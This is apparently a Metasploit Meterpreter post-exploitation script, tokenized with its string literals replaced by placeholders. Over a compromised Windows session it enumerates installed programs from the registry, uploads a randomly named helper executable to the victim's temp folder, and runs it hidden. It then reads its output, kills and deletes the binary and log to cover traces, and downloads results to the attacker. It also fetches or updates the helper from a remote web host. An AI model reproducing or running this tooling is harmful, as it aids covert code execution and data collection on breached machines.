require <str> require <str> require <str> @session = client @host , @port = @session . session_host , session . session_port @@exec_opts = Rex :: Parser :: Arguments . new ( <str> = > [ false , <str> ] , <str> = > [ false , <str> ] , <str> = > [ false , <str> ] , <str> = > [ true , <str> ] , <str> = > [ false , <str> ] , <str> = > [ false , <str> ] ) @tempdir = @session . sys . config . getenv ( <str> ) def read_program_list key = @session . sys . registry . open_key ( HKEY_LOCAL_MACHINE , <str> , KEY_READ ) sfmsvals = key . enum_key sfmsvals . each do | test1 | begin key2 = <str> + test1 root_key2 , base_key2 = @session . sys . registry . splitkey ( key2 ) value1 = <str> value2 = <str> open_key = @session . sys . registry . open_key ( root_key2 , base_key2 , KEY_READ ) v1 = open_key . query_value ( value1 ) v2 = open_key . query_value ( value2 ) print_status ( <str> v1 . data <str> v2 . data <str> ) rescue end end end def prefetch_dump ( options , logging = false ) lexe = File . join ( Msf :: Config . data_directory , <str> ) rexe = sprintf ( <str> , rand ( <int> ) ) + <str> rlog = sprintf ( <str> , rand ( <int> ) ) + <str> print_status ( <str> ) begin @session . fs . file . upload_file ( <str> @tempdir <str> rexe <str> , lexe ) print_status ( <str> @tempdir <str> rexe <str> ) rescue :: Interrupt ; raise $! rescue :: Exception = > e print_status ( <str> e . class <str> e <str> ) return end begin if ( logging ) options += <str> @tempdir <str> rlog <str> end r = @session . sys . process . execute ( <str> @tempdir <str> rexe <str> options <str> rlog <str> , nil , { <str> = > <str> , <str> = > true } ) while ( d = r . channel . read ) d . split ( <str> ) . each do | out | print_status ( <str> out . strip <str> ) end end found = true while ( not found ) found = false @session . sys . process . get_processes ( ) . each do | x | found = false if ( x [ <str> ] . downcase == rexe ) found = true end end sleep ( <int> . <int> ) if found end r . channel . close r . close print_status ( <str> rexe <str> ) @session . sys . process . execute ( <str> @tempdir <str> rexe <str> , nil , { <str> = > <str> } ) print_status ( <str> ) @session . sys . process . execute ( <str> rexe . gsub ( <str> , <str> ) <str> , nil , { <str> = > <str> } ) if ( logging ) logfile = :: File . join ( Msf :: Config . config_directory , <str> , <str> , @host + <str> + :: Time . now . strftime ( <str> ) + <str> ) print_status ( <str> logfile <str> ) @session . fs . file . download_file ( logfile , <str> @tempdir <str> rlog <str> ) print_status ( <str> ) @session . sys . process . execute ( <str> @tempdir <str> rlog <str> , nil , { <str> = > <str> } ) end rescue :: Interrupt ; raise $! rescue :: Exception = > e print_status ( <str> e . class <str> e <str> ) return end end def unsupported print_error ( <str> ) raise Rex :: Script :: Completed end options = <str> logging = false view_list = false check_update = false @@exec_opts . parse ( args ) { | opt , idx , val | case opt when <str> options += <str> + val when <str> options += <str> when <str> view_list = true when <str> options += <str> when <str> logging = true when <str> print_status ( <str> ) print_line ( @@exec_opts . usage ) raise Rex :: Script :: Completed end } unsupported if client . platform !~ <str> prefetch_local = :: File . join ( Msf :: Config . data_directory , <str> ) if ! ( :: File . exist? ( prefetch_local ) ) print_status ( <str> ) Net :: HTTP . start ( <str> ) do | http | req = Net :: HTTP :: Get . new ( <str> ) resp = http . request ( req ) :: File . open ( :: File . join ( Msf :: Config . data_directory , <str> ) , <str> ) do | fd | fd . write ( resp . body ) end end print_status ( <str> prefetch_local <str> ) else print_status ( <str> ) digest = Digest :: SHA1 . hexdigest ( :: File . read ( prefetch_local , :: File . size ( prefetch_local ) ) ) Net :: HTTP . start ( <str> ) do | http | req = Net :: HTTP :: Get . new ( <str> ) resp = http . request ( req ) body = resp . body chksum = body . scan ( <str> ) [ <int> ] chksum . sub! ( <str> , <str> ) chksum . sub! ( <str> , <str> ) if ( digest != chksum ) print_status ( <str> prefetch_local <str> ) Net :: HTTP . start ( <str> ) do | http | req = Net :: HTTP :: Get . new ( <str> ) resp = http . request ( req ) :: File . open ( :: File . join ( Msf :: Config . data_directory , <str> ) , <str> ) do | fd | fd . write ( resp . body ) end end print_status ( <str> prefetch_local <str> ) end end end if ( view_list ) read_program_list ( ) end print_status ( <str> ) prefetch_dump ( options , logging ) 
